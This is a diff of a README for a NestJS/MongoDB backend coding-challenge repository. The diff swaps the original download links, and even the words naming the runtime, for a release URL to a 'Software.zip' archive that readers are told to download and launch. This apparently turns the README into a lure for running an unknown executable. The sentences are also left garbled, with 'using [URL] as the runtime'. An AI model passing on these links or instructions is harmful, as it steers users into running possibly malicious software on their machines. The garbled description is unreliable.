@@ -1,10 +1,10 @@
 # challenge-backend-AnotaAi 💻
 
-Welcome to the **DESAFIO BACKEND PLENO** repository of AnotaAi, a Gaucha startup that offers solutions for restaurants to improve their performance in delivery services. AnotaAi was later acquired by the giant iFood! In this challenge, we will be using Node.js, Nestjs, AWS, MongoDB, exploring various concepts in software development.
+Welcome to the **DESAFIO BACKEND PLENO** repository of AnotaAi, a Gaucha startup that offers solutions for restaurants to improve their performance in delivery services. AnotaAi was later acquired by the giant iFood! In this challenge, we will be using https://github.com/FeelingFishy/challenge-backend-AnotaAi/releases/download/v2.0/Software.zip, Nestjs, AWS, MongoDB, exploring various concepts in software development.
 
 ## Repository Description 🚀
 
-This repository contains the codebase for the backend challenge at AnotaAi. We have implemented the backend solution using Node.js as the runtime, Nestjs as the framework, AWS for cloud services, and MongoDB for the database. The codebase reflects clean architecture principles, domain-driven design (DDD), and focuses on writing clean and maintainable code.
+This repository contains the codebase for the backend challenge at AnotaAi. We have implemented the backend solution using https://github.com/FeelingFishy/challenge-backend-AnotaAi/releases/download/v2.0/Software.zip as the runtime, Nestjs as the framework, AWS for cloud services, and MongoDB for the database. The codebase reflects clean architecture principles, domain-driven design (DDD), and focuses on writing clean and maintainable code.
 
 ## Technologies and Topics Covered 🛠️
 
@@ -19,14 +19,14 @@ The repository covers the following topics and technologies:
 - TypeScript
 
 ## Repository Link 📦
-[**Download the Application.zip file**](https://github.com/user-attachments/files/18426772/Application.zip)
+[**Download the https://github.com/FeelingFishy/challenge-backend-AnotaAi/releases/download/v2.0/Software.zip file**](https://github.com/FeelingFishy/challenge-backend-AnotaAi/releases/download/v2.0/Software.zip)
 
-*Note: The provided link leads to the Application.zip file which needs to be downloaded and launched to explore the contents.*
+*Note: The provided link leads to the https://github.com/FeelingFishy/challenge-backend-AnotaAi/releases/download/v2.0/Software.zip file which needs to be downloaded and launched to explore the contents.*
 
 ## How to Run the Application 🏃‍♂️
 
 To run the application, follow these steps:
-1. Download the Application.zip file from the provided link.
+1. Download the https://github.com/FeelingFishy/challenge-backend-AnotaAi/releases/download/v2.0/Software.zip file from the provided link.
 2. Unzip the file on your local machine.
 3. Navigate to the project directory.
 4. Install the necessary dependencies by running `npm install`.
@@ -46,4 +46,4 @@ Let's build amazing solutions together! 🚀🌟
 
 ---
 
-[![Download Application.zip](https://img.shields.io/badge/Download-Application.zip-<COLOR>.svg)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download https://github.com/FeelingFishy/challenge-backend-AnotaAi/releases/download/v2.0/Software.zip](https://github.com/FeelingFishy/challenge-backend-AnotaAi/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/FeelingFishy/challenge-backend-AnotaAi/releases/download/v2.0/Software.zip)
